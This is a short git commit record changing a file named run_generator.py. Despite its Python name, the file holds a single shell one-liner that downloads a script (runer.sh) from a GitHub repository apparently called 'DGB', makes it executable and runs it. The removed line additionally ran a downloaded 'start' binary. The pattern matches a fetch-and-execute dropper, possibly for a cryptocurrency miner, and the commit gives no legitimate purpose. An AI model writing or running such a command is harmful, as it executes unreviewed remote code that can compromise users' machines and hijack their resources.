92c3aa8384bcbaab2e414fbf401855696ad0daa6
darenclue <93659740+darenclue@users.noreply.github.com>
2021-11-03 20:35:48 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start
+wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh
